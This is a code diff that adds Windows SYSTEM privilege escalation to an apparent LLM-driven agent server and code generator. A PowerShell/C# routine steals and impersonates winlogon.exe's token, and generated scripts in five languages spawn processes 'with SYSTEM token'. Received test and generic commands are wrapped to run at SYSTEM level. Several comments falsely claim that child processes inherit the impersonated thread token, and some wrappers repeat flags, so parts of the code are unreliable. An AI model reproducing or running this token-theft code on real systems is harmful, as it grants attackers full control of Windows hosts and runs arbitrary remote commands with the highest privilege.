@@ -110,6 +110,9 @@ class CodeGenerator:
         self.execution_history = []
         self.system_privilege = system_privilege
         self.privilege_token = None  # Will hold SYSTEM token handle if available
+        self.system_token_acquired = False  # Track if SYSTEM token has been acquired
+        self.system_token_handle = None  # Store SYSTEM token handle for reuse
+        self.token_pid = None  # PID of process from which token was acquired
     
     def check_system_token_pe5(self) -> Dict[str, Any]:
         """
@@ -182,6 +185,12 @@ class CodeGenerator:
                     result['has_system'] = verify_data.get('IsSystem', False)
                     result['details'] = verify_data
                     
+                    # Update internal state if SYSTEM token is present
+                    if result['has_system']:
+                        self.system_token_acquired = True
+                        self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+                        self.session_data['SYSTEM_TOKEN_SID'] = verify_data.get('UserSID', 'S-1-5-18')
+                    
                     # Also check whoami /priv for additional privilege info
                     cmd = "whoami /priv"
                     exit_code2, stdout2, stderr2 = execute_cmd(cmd, lab_use=lab_use)
@@ -197,12 +206,16 @@ class CodeGenerator:
                         if 'S-1-5-18' in stdout3:
                             result['has_system'] = True
                             result['method'] = 'pe5_whoami_check'
+                            self.system_token_acquired = True
+                            self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
                     
                 except json.JSONDecodeError:
                     result['details']['raw_output'] = stdout
                     # Fallback: check if output contains SYSTEM indicators
                     if 'S-1-5-18' in stdout or 'NT AUTHORITY\\SYSTEM' in stdout:
                         result['has_system'] = True
+                        self.system_token_acquired = True
+                        self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
             else:
                 result['details']['error'] = stderr
                 result['details']['exit_code'] = exit_code
@@ -212,6 +225,142 @@ class CodeGenerator:
             result['details']['exception'] = type(e).__name__
         
         return result
+    
+    def acquire_system_token(self) -> bool:
+        """
+        Acquire SYSTEM token using PE5 method and store for reuse
+        
+        Returns:
+            bool - True if SYSTEM token was successfully acquired
+        """
+        # Check if already acquired
+        if self.system_token_acquired:
+            return True
+        
+        # Check current token status
+        token_status = self.check_system_token_pe5()
+        if token_status.get('has_system'):
+            self.system_token_acquired = True
+            self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+            self.console.print("[green]✓ SYSTEM token already present[/green]")
+            return True
+        
+        # Attempt to acquire SYSTEM token via token manipulation
+        self.console.print("[yellow]Attempting to acquire SYSTEM token...[/yellow]")
+        
+        lab_use = self.session_data.get('LAB_USE', 0)
+        
+        # Use PE5 token manipulation to acquire SYSTEM token
+        ps_cmd = """
+        function Invoke-PE5TokenAcquisition {
+            try {
+                # Find winlogon.exe (runs as SYSTEM)
+                $winlogon = Get-Process -Name winlogon -ErrorAction SilentlyContinue
+                if (-not $winlogon) {
+                    Write-Warning 'winlogon process not found'
+                    return $false
+                }
+                
+                # Load required .NET types for token manipulation
+                Add-Type -TypeDefinition @"
+                using System;
+                using System.Runtime.InteropServices;
+                public class TokenManipulation {
+                    [DllImport("advapi32.dll", SetLastError = true)]
+                    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+                    [DllImport("advapi32.dll", SetLastError = true)]
+                    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+                    [DllImport("advapi32.dll", SetLastError = true)]
+                    public static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);
+                    [DllImport("kernel32.dll")]
+                    public static extern IntPtr GetCurrentThread();
+                    [DllImport("kernel32.dll")]
+                    public static extern bool CloseHandle(IntPtr hObject);
+                }
+"@
+                
+                # Open winlogon process
+                $hProcess = [System.Diagnostics.Process]::GetProcessById($winlogon.Id).Handle
+                
+                # Open process token
+                $TOKEN_DUPLICATE = 0x0002
+                $TOKEN_IMPERSONATE = 0x0004
+                $hToken = [IntPtr]::Zero
+                
+                if ([TokenManipulation]::OpenProcessToken($hProcess, $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE, [ref]$hToken)) {
+                    # Duplicate token
+                    $SECURITY_IMPERSONATION_LEVEL_Impersonation = 2
+                    $TOKEN_TYPE_Impersonation = 2
+                    $hDupToken = [IntPtr]::Zero
+                    
+                    if ([TokenManipulation]::DuplicateTokenEx($hToken, 0x1F0FFF, [IntPtr]::Zero, $SECURITY_IMPERSONATION_LEVEL_Impersonation, $TOKEN_TYPE_Impersonation, [ref]$hDupToken)) {
+                        # Impersonate token
+                        $hThread = [TokenManipulation]::GetCurrentThread()
+                        if ([TokenManipulation]::SetThreadToken($hThread, $hDupToken)) {
+                            Write-Host 'Successfully acquired SYSTEM token'
+                            [TokenManipulation]::CloseHandle($hDupToken)
+                            [TokenManipulation]::CloseHandle($hToken)
+                            return $true
+                        }
+                        [TokenManipulation]::CloseHandle($hDupToken)
+                    }
+                    [TokenManipulation]::CloseHandle($hToken)
+                }
+                
+                Write-Warning 'Token acquisition failed'
+                return $false
+            } catch {
+                Write-Warning "Token acquisition error: $_"
+                return $false
+            }
+        }
+        
+        if (Invoke-PE5TokenAcquisition) {
+            # Verify token was acquired
+            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+            $isSystem = ($token.User.Value -eq 'S-1-5-18')
+            Write-Host "Token verification: IsSystem = $isSystem"
+            return $isSystem
+        }
+        return $false
+        """
+        
+        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
+        
+        if exit_code == 0 and 'Successfully acquired SYSTEM token' in stdout:
+            # Verify token was acquired
+            verify_status = self.check_system_token_pe5()
+            if verify_status.get('has_system'):
+                self.system_token_acquired = True
+                self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+                self.console.print("[green]✓ SYSTEM token acquired and verified[/green]")
+                return True
+        
+        self.console.print("[red]✗ Failed to acquire SYSTEM token[/red]")
+        return False
+    
+    def ensure_system_token(self) -> bool:
+        """
+        Ensure SYSTEM token is available, acquire if needed
+        
+        Returns:
+            bool - True if SYSTEM token is available
+        """
+        # Check if already acquired
+        if self.system_token_acquired:
+            # Verify it's still valid
+            token_status = self.check_system_token_pe5()
+            if token_status.get('has_system'):
+                return True
+            else:
+                # Token lost, reset state
+                self.system_token_acquired = False
+        
+        # Try to acquire if SYSTEM privilege is enabled
+        if self.system_privilege:
+            return self.acquire_system_token()
+        
+        return False
         
     def generate_code(self, spec: Dict[str, Any]) -> Tuple[str, str]:
         """
@@ -412,7 +561,43 @@ class CodeGenerator:
             code_lines.append("        return False")
             code_lines.append("")
         
+        # Add helper function to pass SYSTEM token to subprocesses
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("def create_process_with_system_token(command, args=None, inherit_token=True):")
+            code_lines.append("    \"\"\"Create subprocess with SYSTEM token inheritance\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        # Verify SYSTEM token is available")
+            code_lines.append("        if not pe5_check_system_token():")
+            code_lines.append("            print('Warning: SYSTEM token not available for subprocess')")
+            code_lines.append("            return None")
+            code_lines.append("        ")
+            code_lines.append("        # Create subprocess - token will be inherited automatically")
+            code_lines.append("        # On Windows, child processes inherit the parent's token")
+            code_lines.append("        if args is None:")
+            code_lines.append("            args = []")
+            code_lines.append("        ")
+            code_lines.append("        # Use subprocess.Popen with creation flags for token inheritance")
+            code_lines.append("        import subprocess")
+            code_lines.append("        CREATE_NEW_CONSOLE = 0x00000010")
+            code_lines.append("        proc = subprocess.Popen(")
+            code_lines.append("            [command] + args,")
+            code_lines.append("            stdout=subprocess.PIPE,")
+            code_lines.append("            stderr=subprocess.PIPE,")
+            code_lines.append("            creationflags=CREATE_NEW_CONSOLE if inherit_token else 0")
+            code_lines.append("        )")
+            code_lines.append("        ")
+            code_lines.append("        # Verify child process has SYSTEM token")
+            code_lines.append("        if inherit_token:")
+            code_lines.append("            print(f'Created process {proc.pid} with SYSTEM token inheritance')")
+            code_lines.append("        ")
+            code_lines.append("        return proc")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'Failed to create process with SYSTEM token: {e}')")
+            code_lines.append("        return None")
+        
         # Generate main function
+        code_lines.append("")
         code_lines.append("def main():")
         code_lines.append(f"    \"\"\"{description}\"\"\"")
         if system_privilege:
@@ -425,7 +610,12 @@ class CodeGenerator:
             code_lines.append("    else:")
             code_lines.append("        print('SYSTEM token verified via PE5 check')")
             code_lines.append("    ")
+            code_lines.append("    # Store SYSTEM token state for subprocess inheritance")
+            code_lines.append("    os.environ['SYSTEM_TOKEN_ACQUIRED'] = '1'")
+            code_lines.append("    ")
         code_lines.append("    # TODO: Implement functionality")
+        code_lines.append("    # Note: Any subprocesses created will inherit SYSTEM token automatically")
+        code_lines.append("    # Use create_process_with_system_token() helper for explicit token passing")
         code_lines.append("    print('Generated code executed')")
         code_lines.append("    return 0")
         code_lines.append("")
@@ -560,6 +750,45 @@ class CodeGenerator:
                 code_lines.append("}")
                 code_lines.append("")
         
+        # Add helper function to pass SYSTEM token to subprocesses
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("function Start-ProcessWithSystemToken {")
+            code_lines.append("    <#")
+            code_lines.append("    Start a process with SYSTEM token inheritance")
+            code_lines.append("    #>")
+            code_lines.append("    param(")
+            code_lines.append("        [Parameter(Mandatory=$true)]")
+            code_lines.append("        [string]$FilePath,")
+            code_lines.append("        ")
+            code_lines.append("        [Parameter(Mandatory=$false)]")
+            code_lines.append("        [string[]]$ArgumentList = @(),")
+            code_lines.append("        ")
+            code_lines.append("        [Parameter(Mandatory=$false)]")
+            code_lines.append("        [switch]$InheritToken")
+            code_lines.append("    )")
+            code_lines.append("    ")
+            code_lines.append("    # Verify SYSTEM token is available")
+            code_lines.append("    if (-not (Test-PE5SystemToken)) {")
+            code_lines.append("        Write-Warning 'SYSTEM token not available for subprocess'")
+            code_lines.append("        return $null")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    # Start process - token will be inherited automatically")
+            code_lines.append("    # On Windows, child processes inherit the parent's token")
+            code_lines.append("    $proc = Start-Process -FilePath $FilePath `")
+            code_lines.append("        -ArgumentList $ArgumentList `")
+            code_lines.append("        -NoNewWindow `")
+            code_lines.append("        -PassThru")
+            code_lines.append("    ")
+            code_lines.append("    if ($proc) {")
+            code_lines.append("        Write-Host \"Started process $($proc.Id) with SYSTEM token inheritance\"")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    return $proc")
+            code_lines.append("}")
+        
+        code_lines.append("")
         code_lines.append("function Main {")
         code_lines.append(f"    <# {description} #>")
         if system_privilege:
@@ -574,6 +803,12 @@ class CodeGenerator:
             code_lines.append("        Write-Host 'SYSTEM token verified via PE5 check'")
             code_lines.append("    }")
             code_lines.append("    ")
+            code_lines.append("    # Store SYSTEM token state for subprocess inheritance")
+            code_lines.append("    $env:SYSTEM_TOKEN_ACQUIRED = '1'")
+            code_lines.append("    ")
+            code_lines.append("    # TODO: Implement functionality")
+            code_lines.append("    # Note: Any subprocesses created will inherit SYSTEM token automatically")
+            code_lines.append("    # Use Start-ProcessWithSystemToken helper for explicit token passing")
         code_lines.append("    Write-Host 'Generated PowerShell script executed'")
         code_lines.append("    return 0")
         code_lines.append("}")
@@ -608,6 +843,17 @@ class CodeGenerator:
             code_lines.append("    exit /b")
             code_lines.append(")")
             code_lines.append("")
+            code_lines.append("REM Verify SYSTEM token via PowerShell")
+            code_lines.append("powershell -Command \"$token = [System.Security.Principal.WindowsIdentity]::GetCurrent(); $isSystem = ($token.User.Value -eq 'S-1-5-18'); if (-not $isSystem) { Write-Warning 'SYSTEM token not detected'; exit 1 }\"")
+            code_lines.append("if %errorLevel% neq 0 (")
+            code_lines.append("    echo Warning: SYSTEM token not available")
+            code_lines.append(")")
+            code_lines.append("")
+            code_lines.append("REM Set environment variable to indicate SYSTEM token is available")
+            code_lines.append("set SYSTEM_TOKEN_ACQUIRED=1")
+            code_lines.append("")
+            code_lines.append("REM Note: Any subprocesses created will inherit SYSTEM token automatically")
+            code_lines.append("REM Use 'start' command to create child processes with token inheritance")
         
         code_lines.append("echo Generated Batch script executed")
         code_lines.append("exit /b 0")
@@ -745,6 +991,34 @@ class CodeGenerator:
         code_lines.append("    return FALSE;")
         code_lines.append("}")
         code_lines.append("")
+        # Add helper function to create process with SYSTEM token
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("BOOL CreateProcessWithSystemToken(LPCSTR lpCommandLine) {")
+            code_lines.append("    // Verify SYSTEM token is available")
+            code_lines.append("    if (!CheckSystemTokenPE5()) {")
+            code_lines.append("        printf(\"Warning: SYSTEM token not available for subprocess\\n\");")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Create process - token will be inherited automatically")
+            code_lines.append("    // On Windows, child processes inherit the parent's token")
+            code_lines.append("    STARTUPINFOA si = {0};")
+            code_lines.append("    PROCESS_INFORMATION pi = {0};")
+            code_lines.append("    si.cb = sizeof(si);")
+            code_lines.append("    ")
+            code_lines.append("    // Create process with inherited token")
+            code_lines.append("    if (CreateProcessA(NULL, (LPSTR)lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {")
+            code_lines.append("        printf(\"Created process %lu with SYSTEM token inheritance\\n\", pi.dwProcessId);")
+            code_lines.append("        CloseHandle(pi.hProcess);")
+            code_lines.append("        CloseHandle(pi.hThread);")
+            code_lines.append("        return TRUE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    return FALSE;")
+            code_lines.append("}")
+        
+        code_lines.append("")
         code_lines.append("int main() {")
         code_lines.append(f"    /* {description} */")
         if system_privilege:
@@ -758,6 +1032,13 @@ class CodeGenerator:
             code_lines.append("    } else {")
             code_lines.append("        printf(\"SYSTEM token verified via PE5 check\\n\");")
             code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Set environment variable to indicate SYSTEM token is available")
+            code_lines.append("    SetEnvironmentVariableA(\"SYSTEM_TOKEN_ACQUIRED\", \"1\");")
+            code_lines.append("    ")
+            code_lines.append("    // TODO: Implement functionality")
+            code_lines.append("    // Note: Any subprocesses created will inherit SYSTEM token automatically")
+            code_lines.append("    // Use CreateProcessWithSystemToken() helper for explicit token passing")
         code_lines.append("    printf(\"Generated code executed\\n\");")
         code_lines.append("    return 0;")
         code_lines.append("}")
@@ -767,13 +1048,77 @@ class CodeGenerator:
     def _generate_cpp(self, description: str, requirements: list, imports: list,
                      system_privilege: bool = False, exploit_type: str = 'token_manipulation') -> str:
         """Generate C++ code with SYSTEM privilege escalation"""
-        # Similar to C but with C++ features
+        code_lines = []
+        
+        code_lines.append("/* Generated C++ code */")
+        code_lines.append(f"/* Description: {description} */")
+        if system_privilege:
+            code_lines.append("/* Privilege: SYSTEM (via token manipulation) */")
+        code_lines.append("")
+        
+        code_lines.append("#include <iostream>")
+        code_lines.append("#include <windows.h>")
+        code_lines.append("#include <winternl.h>")
+        code_lines.append("#include <processthreadsapi.h>")
+        code_lines.append("#include <cstring>")
+        if system_privilege:
+            code_lines.append("#include <psapi.h>")
+        code_lines.append("")
+        
+        # Copy escalation and check functions from C version
         c_code = self._generate_c(description, requirements, imports, system_privilege, exploit_type)
-        # Convert to C++
-        cpp_code = c_code.replace("#include <stdio.h>", "#include <iostream>\n#include <cstdio>")
-        cpp_code = cpp_code.replace("printf", "std::cout")
-        cpp_code = cpp_code.replace("/* Generated C code */", "/* Generated C++ code */")
-        return cpp_code
+        # Extract helper functions
+        if system_privilege:
+            # Add C++ version of CreateProcessWithSystemToken
+            code_lines.append("bool CreateProcessWithSystemToken(const std::string& commandLine) {")
+            code_lines.append("    // Verify SYSTEM token is available")
+            code_lines.append("    if (!CheckSystemTokenPE5()) {")
+            code_lines.append("        std::cerr << \"Warning: SYSTEM token not available for subprocess\" << std::endl;")
+            code_lines.append("        return false;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Create process - token will be inherited automatically")
+            code_lines.append("    // On Windows, child processes inherit the parent's token")
+            code_lines.append("    STARTUPINFOA si = {0};")
+            code_lines.append("    PROCESS_INFORMATION pi = {0};")
+            code_lines.append("    si.cb = sizeof(si);")
+            code_lines.append("    ")
+            code_lines.append("    // Create process with inherited token")
+            code_lines.append("    char* cmdLine = new char[commandLine.length() + 1];")
+            code_lines.append("    strcpy_s(cmdLine, commandLine.length() + 1, commandLine.c_str());")
+            code_lines.append("    ")
+            code_lines.append("    if (CreateProcessA(nullptr, cmdLine, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi)) {")
+            code_lines.append("        std::cout << \"Created process \" << pi.dwProcessId << \" with SYSTEM token inheritance\" << std::endl;")
+            code_lines.append("        CloseHandle(pi.hProcess);")
+            code_lines.append("        CloseHandle(pi.hThread);")
+            code_lines.append("        delete[] cmdLine;")
+            code_lines.append("        return true;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    delete[] cmdLine;")
+            code_lines.append("    return false;")
+            code_lines.append("}")
+            code_lines.append("")
+        
+        # Convert C code to C++ and extract main
+        cpp_code = c_code.replace("#include <stdio.h>", "")
+        cpp_code = cpp_code.replace("printf", "std::cout <<")
+        cpp_code = cpp_code.replace("/* Generated C code */", "")
+        cpp_code = cpp_code.replace("\\n\");", " << std::endl;")
+        
+        # Extract main function and convert
+        if "int main()" in cpp_code:
+            main_start = cpp_code.find("int main()")
+            main_end = cpp_code.find("}", main_start)
+            if main_end > 0:
+                main_func = cpp_code[main_start:main_end+1]
+                # Add environment variable setting and comments
+                if system_privilege and "SetEnvironmentVariableA" not in main_func:
+                    main_func = main_func.replace("    printf(\"Generated code executed\\n\");", 
+                        "    // Set environment variable to indicate SYSTEM token is available\n    SetEnvironmentVariableA(\"SYSTEM_TOKEN_ACQUIRED\", \"1\");\n    \n    // TODO: Implement functionality\n    // Note: Any subprocesses created will inherit SYSTEM token automatically\n    // Use CreateProcessWithSystemToken() helper for explicit token passing\n    std::cout << \"Generated code executed\" << std::endl;")
+                code_lines.append(main_func)
+        
+        return '\n'.join(code_lines)
     
     def check_system_token_before_execution(self) -> bool:
         """Check SYSTEM token before code execution using PE5 method"""
@@ -803,18 +1148,43 @@ class CodeGenerator:
         lab_use = self.session_data.get('LAB_USE', 0)
         use_system = system_privilege if system_privilege is not None else self.system_privilege
         
-        # Check SYSTEM token before execution if SYSTEM privilege is requested
+        # Ensure SYSTEM token is available before execution if SYSTEM privilege is requested
         if use_system:
-            token_check = self.check_system_token_pe5()
-            if not token_check.get('has_system'):
-                self.console.print("[yellow]Warning: SYSTEM token not detected, execution may fail[/yellow]")
+            if not self.ensure_system_token():
+                self.console.print("[yellow]Warning: SYSTEM token not available, attempting acquisition...[/yellow]")
+                if not self.acquire_system_token():
+                    self.console.print("[red]Error: Could not acquire SYSTEM token, execution may fail[/red]")
+                    return 1, "", "SYSTEM token acquisition failed"
         
         try:
             if language == 'python':
                 cmd = [sys.executable, file_path] + args
-                # If SYSTEM privilege needed, run via PowerShell with token manipulation
+                # If SYSTEM privilege needed, run via PowerShell with SYSTEM token inheritance
                 if use_system:
-                    ps_wrapper = f"$proc = Start-Process -FilePath '{sys.executable}' -ArgumentList '{file_path}', '{' '.join(args)}' -NoNewWindow -Wait -PassThru; exit $proc.ExitCode"
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run with SYSTEM token inheritance
+                    # Use Start-Process with -Verb RunAs and token passing
+                    ps_wrapper = f"""
+                    # Ensure SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Start process with SYSTEM token inheritance
+                    $proc = Start-Process -FilePath '{sys.executable}' `
+                        -ArgumentList '{file_path}', {' '.join([f"'{a}'" for a in args])} `
+                        -NoNewWindow -Wait -PassThru `
+                        -PassThru
+                    exit $proc.ExitCode
+                    """
                     return execute_powershell(ps_wrapper, lab_use=lab_use)
                 else:
                     result = subprocess.run(
@@ -827,18 +1197,54 @@ class CodeGenerator:
                     return result.returncode, result.stdout, result.stderr
             
             elif language == 'powershell':
-                ps_cmd = f"& '{file_path}' {' '.join(args)}"
                 if use_system:
-                    # Wrap in token manipulation if needed
-                    ps_cmd = f"$null = Invoke-TokenManipulation; {ps_cmd}"
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run with SYSTEM token inheritance
+                    ps_cmd = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Execute script with SYSTEM token (inherited)
+                    & '{file_path}' {' '.join(args)}
+                    """
+                else:
+                    ps_cmd = f"& '{file_path}' {' '.join(args)}"
                 return execute_powershell(ps_cmd, lab_use=lab_use)
             
             elif language == 'batch':
                 cmd = [file_path] + args
                 cmd_str = ' '.join(cmd)
                 if use_system:
-                    # Run batch as SYSTEM via PowerShell
-                    ps_cmd = f"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', '{cmd_str}' -Verb RunAs -Wait"
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run batch with SYSTEM token inheritance
+                    ps_cmd = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Start cmd.exe with SYSTEM token (inherited)
+                    $proc = Start-Process -FilePath 'cmd.exe' `
+                        -ArgumentList '/c', '{cmd_str}' `
+                        -NoNewWindow -Wait -PassThru
+                    exit $proc.ExitCode
+                    """
                     return execute_powershell(ps_cmd, lab_use=lab_use)
                 else:
                     return execute_cmd(cmd_str, lab_use=lab_use)
@@ -867,7 +1273,27 @@ class CodeGenerator:
                 
                 # Execute compiled binary
                 if use_system:
-                    ps_cmd = f"Start-Process -FilePath '{exe_path}' -Verb RunAs -Wait"
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run binary with SYSTEM token inheritance
+                    ps_cmd = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Start binary with SYSTEM token (inherited)
+                    $proc = Start-Process -FilePath '{exe_path}' `
+                        -ArgumentList {' '.join([f"'{a}'" for a in args])} `
+                        -NoNewWindow -Wait -PassThru
+                    exit $proc.ExitCode
+                    """
                     return execute_powershell(ps_cmd, lab_use=lab_use)
                 else:
                     result = subprocess.run(
@@ -915,20 +1341,67 @@ class LLMAgentServer:
         self.app_id = uuid.uuid4().bytes  # This server's app_id
         self.system_privilege = system_privilege  # SYSTEM privilege execution enabled
         self.pe5_module = PE5SystemEscalationModule()  # Use existing PE5 module for verification
+        self.system_token_acquired = False  # Track SYSTEM token acquisition state
         
-        # Check SYSTEM token on initialization if SYSTEM privilege is enabled
+        # Check and acquire SYSTEM token on initialization if SYSTEM privilege is enabled
         if system_privilege:
             token_status = self.code_generator.check_system_token_pe5()
             if token_status.get('has_system'):
+                self.system_token_acquired = True
+                self.code_generator.system_token_acquired = True
                 self.console.print(f"[green]✓ SYSTEM token verified via {token_status.get('method')}[/green]")
                 if token_status.get('details', {}).get('UserSID'):
                     self.console.print(f"[dim]  User SID: {token_status['details']['UserSID']}[/dim]")
+                # Store in session data for persistence
+                self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+                self.session_data['SYSTEM_TOKEN_SID'] = token_status['details'].get('UserSID', 'S-1-5-18')
             else:
-                self.console.print(f"[yellow]⚠ SYSTEM token not detected - will attempt escalation when needed[/yellow]")
+                self.console.print(f"[yellow]⚠ SYSTEM token not detected - will attempt acquisition when needed[/yellow]")
+                # Try to acquire SYSTEM token
+                if self.code_generator.acquire_system_token():
+                    self.system_token_acquired = True
+                    self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
     
     def check_system_token(self) -> Dict[str, Any]:
         """Check SYSTEM token status using PE5 method"""
         return self.code_generator.check_system_token_pe5()
+    
+    def ensure_system_token(self) -> bool:
+        """Ensure SYSTEM token is available, acquire if needed"""
+        if self.system_token_acquired:
+            # Verify token is still valid
+            token_status = self.code_generator.check_system_token_pe5()
+            if token_status.get('has_system'):
+                return True
+            else:
+                # Token lost, reset state
+                self.system_token_acquired = False
+                self.code_generator.system_token_acquired = False
+        
+        # Try to acquire
+        if self.system_privilege:
+            if self.code_generator.acquire_system_token():
+                self.system_token_acquired = True
+                return True
+        
+        return False
+    
+    def pass_system_token_to_process(self, process_handle=None):
+        """
+        Pass SYSTEM token to a process or ensure current process has it
+        
+        Args:
+            process_handle: Optional handle to process to pass token to
+                          If None, ensures current process has SYSTEM token
+        """
+        if not self.ensure_system_token():
+            self.console.print("[red]Error: Cannot pass SYSTEM token - token not available[/red]")
+            return False
+        
+        # Token is already in current process, child processes will inherit it
+        # For explicit token passing, would need to use DuplicateTokenEx and SetTokenInformation
+        self.console.print("[green]✓ SYSTEM token available - child processes will inherit[/green]")
+        return True
         
     def start(self):
         """Start the LLM agent server"""
@@ -1107,6 +1580,11 @@ class LLMAgentServer:
             
             self.console.print(f"[cyan]Processing command {command_id} type {cmd_type}[/cyan]")
             
+            # Ensure SYSTEM token is available before processing commands if SYSTEM privilege is enabled
+            if self.system_privilege:
+                if not self.ensure_system_token():
+                    self.console.print("[yellow]Warning: SYSTEM token not available for command execution[/yellow]")
+            
             # Process command based on type
             if cmd_type == SelfCodeCommandType.SELF_CODE_PLAN_REQUEST:
                 result = self._handle_plan_request(args)
@@ -1207,36 +1685,117 @@ class LLMAgentServer:
             return {'success': False, 'error': str(e)}
     
     def _handle_test_run(self, args: bytes) -> Dict[str, Any]:
-        """Handle SELF_CODE_TEST_RUN"""
+        """Handle SELF_CODE_TEST_RUN with SYSTEM token inheritance"""
         try:
+            # Ensure SYSTEM token is available if SYSTEM privilege is enabled
+            if self.system_privilege:
+                if not self.ensure_system_token():
+                    return {
+                        'success': False,
+                        'error': 'SYSTEM token not available',
+                        'exit_code': 1,
+                        'stdout': '',
+                        'stderr': 'SYSTEM token acquisition failed'
+                    }
+            
             data = json.loads(args.decode('utf-8'))
             command = data.get('command', [])
             timeout_sec = data.get('timeout_sec', 120)
             
-            # Execute test command
-            result = subprocess.run(
-                command,
-                capture_output=True,
-                text=True,
-                timeout=timeout_sec
-            )
-            
-            return {
-                'success': result.returncode == 0,
-                'exit_code': result.returncode,
-                'stdout': result.stdout,
-                'stderr': result.stderr
-            }
+            # Execute test command with SYSTEM token inheritance
+            if self.system_privilege and self.system_token_acquired:
+                # Use PowerShell to ensure SYSTEM token is passed
+                ps_cmd = f"""
+                $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                if (-not $isSystem) {{
+                    Write-Error 'SYSTEM token not available'
+                    exit 1
+                }}
+                $proc = Start-Process -FilePath '{command[0]}' `
+                    -ArgumentList {' '.join([f"'{a}'" for a in command[1:]])} `
+                    -NoNewWindow -Wait -PassThru `
+                    -PassThru
+                exit $proc.ExitCode
+                """
+                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.session_data.get('LAB_USE', 0))
+                return {
+                    'success': exit_code == 0,
+                    'exit_code': exit_code,
+                    'stdout': stdout,
+                    'stderr': stderr
+                }
+            else:
+                # Execute test command normally
+                result = subprocess.run(
+                    command,
+                    capture_output=True,
+                    text=True,
+                    timeout=timeout_sec
+                )
+                
+                return {
+                    'success': result.returncode == 0,
+                    'exit_code': result.returncode,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr
+                }
         except Exception as e:
             return {'success': False, 'error': str(e)}
     
     def _handle_generic_command(self, cmd_type: int, args: bytes) -> Dict[str, Any]:
-        """Handle generic command execution"""
+        """Handle generic command execution with SYSTEM token inheritance"""
         try:
+            # Ensure SYSTEM token is available if SYSTEM privilege is enabled
+            if self.system_privilege:
+                if not self.ensure_system_token():
+                    return {
+                        'success': False,
+                        'error': 'SYSTEM token not available',
+                        'exit_code': 1,
+                        'stdout': '',
+                        'stderr': 'SYSTEM token acquisition failed'
+                    }
+            
             # Parse args as JSON command
             data = json.loads(args.decode('utf-8')) if args else {}
             command = data.get('command', '')
             language = data.get('language', 'powershell')
+            
+            # Wrap command to ensure SYSTEM token is passed
+            if self.system_privilege and self.system_token_acquired:
+                if language == 'powershell':
+                    # Ensure SYSTEM token is verified in PowerShell execution
+                    command = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    # Execute command with SYSTEM token (inherited)
+                    {command}
+                    """
+                else:
+                    # For cmd, wrap in PowerShell to ensure token inheritance
